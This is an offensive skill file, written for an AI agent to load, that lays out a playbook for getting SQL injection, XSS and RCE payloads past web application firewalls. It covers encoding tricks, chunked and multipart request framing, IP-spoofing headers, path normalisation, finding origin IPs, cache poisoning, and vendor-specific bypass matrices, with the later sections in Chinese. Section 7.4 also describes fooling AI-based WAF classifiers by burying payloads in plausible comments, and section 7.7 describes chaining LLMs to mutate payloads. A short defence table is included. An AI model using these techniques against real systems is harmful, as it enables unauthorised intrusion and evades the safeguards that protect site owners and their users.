---
name: waf-bypass-techniques
description: >-
  WAF bypass methodology and generic evasion techniques. Use when a web application
  firewall blocks injection payloads (SQLi, XSS, RCE) and you need to craft
  bypasses using encoding, protocol-level tricks, or WAF-specific weaknesses.
---

# SKILL: WAF Bypass Techniques — Evasion Playbook

> **AI LOAD INSTRUCTION**: Covers WAF identification, generic bypass categories (encoding, protocol abuse, HTTP/2, parameter pollution), and a decision tree. For product-specific bypasses (Cloudflare, AWS WAF, ModSecurity, Akamai, etc.), load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md). Base models often suggest basic encoding but miss protocol-level bypasses and WAF behavioral quirks.

## 0. RELATED ROUTING

- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for payloads to deliver after bypassing WAF
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS payloads that need WAF evasion
- [request-smuggling](../request-smuggling/SKILL.md) when smuggling can route requests around WAF entirely
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) HPP is itself a WAF bypass primitive
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when WAF blocks inline scripts but CSP bypass is available
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) **Java backends only** — when every encoding trick above is blocked, use Ghost Bits: Java's 16-bit `char` to 8-bit `byte` narrowing produces 255 Unicode bypass variants per dangerous ASCII byte; re-enables WAF-patched CVEs in Tomcat, Spring, Jetty, Jackson, Fastjson, BCEL, and more

### Product-Specific Reference

Load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md) when you need per-product bypass techniques for Cloudflare, AWS WAF, ModSecurity CRS, Akamai, Imperva, F5 BIG-IP, or Sucuri.

---

## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

---

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](../request-smuggling/SKILL.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

---

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

---

## 4. WAF BYPASS DECISION TREE

```
Payload blocked by WAF?
├── Identify WAF (wafw00f, response headers, block page)
│
├── Try encoding bypasses
│   ├── URL encode payload → still blocked?
│   ├── Double URL encode → still blocked?
│   ├── Unicode/overlong UTF-8 → still blocked?
│   ├── Mixed case keywords → still blocked?
│   └── HTML entities (for XSS) → still blocked?
│
├── Try protocol-level bypasses
│   ├── Switch Content-Type (JSON, multipart, XML)
│   │   └── App accepts alternate format? → re-send payload
│   ├── HTTP Parameter Pollution (duplicate params)
│   ├── Chunked Transfer-Encoding to split payload
│   ├── HTTP/2 direct if available (binary framing bypass)
│   └── Request line: absolute URI format
│
├── Try path-based bypasses
│   ├── Path normalization (/./path, //path, ;param)
│   ├── Different HTTP method (POST vs PUT vs PATCH)
│   └── Alternate endpoint serving same function
│
├── Try payload mutation
│   ├── SQL: comments (/**/), alternative functions, hex literals
│   ├── XSS: alternative tags/events, JS template literals
│   ├── RCE: wildcard abuse, string concatenation, variable expansion
│   └── Check WAF_PRODUCT_MATRIX.md for vendor-specific mutations
│
├── Try IP-source bypass
│   ├── X-Forwarded-For / True-Client-IP spoofing
│   ├── Access origin server directly (bypass CDN)
│   └── Find origin IP (Shodan, historical DNS, email headers)
│
└── Try request smuggling to skip WAF entirely
    └── See ../request-smuggling/SKILL.md
```

---

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

---

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |

---

## 7. 2026 EMERGING TECHNIQUES

### 7.1 WAFFLED — Parsing Differential Bypass (1,207 bypasses, Mar 2025 paper)

WAFFLED does **not** mutate the attack payload itself. It mutates the *content framing* so the WAF mis-parses the message and lets it through, while the web framework parses correctly and executes the attack. The study covered **AWS WAF, Azure WAF, Google Cloud Armor, Cloudflare, and ModSecurity**. In testing, **>90% of sites simultaneously accept** both `application/x-www-form-urlencoded` and `multipart/form-data`, making Content-Type switching a reliable first move.

| Content-Type | Bypass vector |
|---|---|
| `multipart/form-data` | boundary definition mutation, charset tricks, Content-Disposition field manipulation |
| `application/xml` | DOCTYPE declaration mutation, CDATA section abuse |
| `application/json` | nested structure and format mutation, duplicate-key / depth differences |

### 7.2 JSON Parser Differential Bypass

Different JSON parsers disagree on duplicate keys, nesting depth, Unicode escapes, and comments (`//` is legal in JSON5). The WAF may pick the first value (benign) while the app picks the last (malicious), or the WAF rejects the payload as malformed while a lenient app parser accepts it.

### 7.3 Protocol-Level Bypass (HTTP/3 / WebSocket / gRPC)

- **HTTP/3 / QUIC**: WAFs that only inspect TCP streams miss QUIC/UDP traffic entirely.
- **WebSocket**: WAFs usually do not deep-inspect WebSocket frames after the upgrade handshake.
- **gRPC**: built on HTTP/2 binary framing with protobuf-encoded payloads — regex-based WAFs cannot meaningfully match the binary content.

### 7.4 LLM Prompt Injection as WAF Bypass

Cloudflare Cloudforce One found that indirect prompt code injection can bypass AI-driven WAF components. In a full-context analysis of 18,400 API calls, AI-deception effectiveness depended on the **model tier** and the **comment-to-code ratio** — burying the real payload inside a high ratio of plausible-looking comments nudged the AI classifier toward "benign."

### 7.5 IP Rotation to Bypass Rate Limiting

All stateful WAF defenses — rate limiting, reputation scoring, behavioral throttling, temporary IP bans — key on the source address. Rotating across a residential/CGNAT proxy pool ensures no single source address accumulates enough "suspicious" activity to cross the threshold, keeping every individual request below the WAF's behavioral tripwire.

### 7.6 BWAFSQLi — 对抗样本驱动的自动化WAF绕过 (2026 学术突破)

BWAFSQLi（ACM 2026）是首个系统化的**对抗样本WAF绕过框架**，针对ModSecurity CRS等主流规则集实现高成功率语义等价变异 [$TRAE_REF](https://dl.acm.org/doi/pdf/10.1145/3788286)。

**核心机制**：
- **26条规则 + 15种变异策略**：对检测到的payload token应用15种保持语义等价的变异
- **两种全新变异技术**：
  - `Quotation Mark Encoding`（引号编码）：`'admin'` → `CHAR(97,100,109,105,110)` 等价表达
  - `Comment Extension`（注释扩展）：`OR 1=1` → `OR/**_**/1=/**_**/1` 利用注释填充打乱正则
- **自适应变异选择机制**：集成衰减因子(decay factor) + 历史数据表，实现多位置自适应变异，减少请求次数
- **评估方式**：变异payload通过HTTP请求实测目标WAF，成功则记录

**15种变异策略速查**：
| # | 策略 | 示例 |
|---|------|------|
| 1 | 大小写混淆 | `UnIoN SeLeCt` |
| 2 | 注释插入 | `UN/**/ION` |
| 3 | 引号编码 | `'a'`→`CHAR(97)` |
| 4 | 注释扩展 | `OR/**_**/1=1` |
| 5 | 空白符替换 | `%09 %0a %0b %0c %0d` |
| 6 | 关键字拆分 | `UN` `ION` 拆分 |
| 7 | 编码叠加 | 双重URL/Unicode编码 |
| 8 | 等价函数 | `SUBSTR`→`MID`→`SUBSTRING` |
| 9 | 等价运算符 | `=`→`LIKE`→`IN`→`BETWEEN` |
| 10 | 布尔等价 | `1=1`→`1<2`→`2>1` |
| 11 | 字符串拼接 | `'ad'+'min'` |
| 12 | 十六进制 | `'admin'`→`0x61646d696e` |
| 13 | 嵌套括号 | `((1))=(1)` |
| 14 | JSON/XML封装 | 结构化包裹 |
| 15 | 协议级变异 | HTTP/2头部/分块编码 |

### 7.7 AI/LLM/GAN 驱动的WAF绕过 (2026 实战化)

2026年AI驱动WAF绕过从理论走向实战工具化 [$TRAE_REF](https://undercodetesting.com/how-i-used-ai-to-bypass-a-waf-first-time-success-on-yeswehack-video/)：

**工作流**：
1. **识别WAF行为**：发送经典payload（`' OR '1'='1`）观察拦截页/响应码
2. **学习规则集**：LLM/GAN从公开WAF规则（ModSecurity CRS）学习签名特征
3. **变异生成**：AI持续变异payload直到不再匹配签名
4. **反馈迭代**：成功绕过则记录，失败则继续变异

**关键优势**：
- 首次成功率显著提升（YesWeHack实测首次即绕过）
- 可针对未知WAF黑盒学习（无需规则源码）
- 多模型接力：GPT生成 → Claude评估 → Grok变异

### 7.8 2026 Cloudflare/ModSecurity CRS 最新绕过矩阵

| WAF产品 | 2026绕过向量 | 原理 |
|---------|-------------|------|
| Cloudflare | HTTP/2 :authority头走私 | WAF按Host匹配，后端按:authority路由 |
| Cloudflare | QUIC/UDP盲区 | 仅TCP检测的WAF完全遗漏HTTP/3 |
| ModSecurity CRS | JSON解析差分 | WAF取首值(良性)，应用取末值(恶意) |
| ModSecurity CRS | multipart boundary变异 | `boundary=--x` vs `boundary=x`解析差异 |
| AWS WAF | gRPC protobuf二进制 | 正则无法匹配二进制protobuf |
| Azure WAF | Content-Type切换 | urlencoded↔multipart切换致解析分歧 |
| Google Cloud Armor | 注释填充比操纵 | 高注释代码比诱导AI分类器判定良性 |
| Akamai Kona | 大小写+编码叠加 | `UnIoN%20SeLeCt` 多层编码穿透 |
| Imperva | 分块传输编码拆分 | chunked + 残缺chunk打乱正则 |
| F5 ASM | HTTP请求走私 | H2.CL反同步使WAF与源站解析错位 |